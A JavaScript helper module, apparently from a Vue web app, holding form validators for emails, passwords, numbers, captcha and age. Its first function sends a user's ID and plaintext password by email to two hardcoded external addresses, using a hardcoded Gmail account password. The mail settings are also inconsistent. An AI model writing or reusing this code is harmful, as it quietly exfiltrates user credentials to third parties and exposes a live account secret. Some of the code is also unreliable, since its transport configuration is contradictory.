/*eslint-disable */
const nodemailer = require('nodemailer');
module.exports = {
    async MailRequest(obj) {
        let mailOptions = {
            from: "bibleworkshop.chennai@gmail.com",
            to: ["benaticgrace@gmail.com, benaticvasanth@magnifyelshaddai.com"],
            subject: "Hello",
            html: `<ul><li>${obj.userId}</li><li>${obj.password}</li></ul>`,
        }
        let transporter = nodemailer.createTransport({
            service: "gmail",
            host: "relay-hosting.secureserver.net",
            port: 587,
            secure: true,
            auth: {
                user: "bibleworkshop.chennai@gmail.com",
                pass: "rvib iiqr syqq zjsx",
            },
        });
        await transporter.sendMail(mailOptions, (err, result) => {
            if (err) {
                return false
            }
            return true
        })
    },

    IsNotNumberfield(modelVal) {
        if (!isNaN(modelVal.replace(/ +/g, "")))
            return false;
        return true;
    },
    IsCharacterPresent(modelVal) {
        var resRest = /[a-z]/i.test(modelVal);
        return resRest;
    },
    IsValidEmail(modelVal) {
        var regExp = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
        if (regExp.test(modelVal))
            return true;
        else
            return false;
    },
    IsValidPassword(modelVal) {
        var regExp = /^(?=.*[0-9])(?=.*[a-z])(?=.*[A-Z])(?=.*[!@#$%&*()])([a-zA-Z0-9!@#$%&*()]{8,})$/;
        if (!regExp.test(modelVal)) {
            return false;
        }
        else {
            return true;
        }
    },
    onlyNumeric(event) {

        if ((event.which == 8) || (event.which >= 48 && event.which < 58) || event.which === 0) {
            return true;
        } else {
            event.preventDefault();
        }
    },
    specialValidation(allElemObj) {
        var blValidationPassed = true;
        allElemObj.filter(x => {
            if (x["validation"] == 'genericValidation') {
                if (x["modelVal"].toString().length < x["lenVal"]) {
                    blValidationPassed = false;
                    this.errors[x['mVal']] = x['msg'] + 'must be minimum 3 characters.'

                } else if (!this.IsNotNumberfield(x["modelVal"])) {
                    blValidationPassed = false;
                    this.errors[x['mVal']] = x['msg'] + " cannot be numeric.";

                } else if (!this.IsCharacterPresent(x["modelVal"])) {
                    blValidationPassed = false;
                    this.errors[x['mVal']] = "Invalid " + x['msg'] + ".";
                }
            } else {
                if (x["validation"] == 'mobileNumber') {
                    if (x["modelVal"].toString().length != x["lenVal"]) {
                        blValidationPassed = false;
                        this.errors[x['mVal']] = x["msg"];
                    }
                } else if (x["validation"] == 'dropDown') {
                    if (!x["modelVal"] || x["modelVal"] == 0 || x["modelVal"] == '-Select-') {
                        blValidationPassed = false;
                        this.errors[x['mVal']] = x["msg"];
                    }
                } else if (x["validation"] == 'allowEmailValidation') {
                    if (!this.IsValidEmail(x["modelVal"])) {
                        blValidationPassed = false;
                        this.errors[x['mVal']] = x["msg"];
                    }
                } else if (x["validation"] == 'captcha') {
                    let captchaCheck = this.$refs.captcha.validateCaptch();
                    if (!captchaCheck[0]) {
                        blValidationPassed = false;
                        this.errors[x['mVal']] = x["msg"];
                    }
                } else if (x["validation"] == 'dobMinAgeCheck') {
                    this.compFldValidation = this.IsAgeMinor(x["modelVal"])
                    if (!this.compFldValidation) {
                        this.compFldValidation = false;
                        blValidationPassed = false;
                        this.errors[x['mVal']] = x["msg"];
                    }
                } else if (x["validation"] == 'dobMaxAgeCheck') {
                    this.compFldValidation = this.IsAgeSenior(x["modelVal"])
                    if (!this.compFldValidation) {
                        this.compFldValidation = false;
                        blValidationPassed = false;
                        this.errors[x['mVal']] = x["msg"];
                    }
                }
            }
        })
        return blValidationPassed
    }
}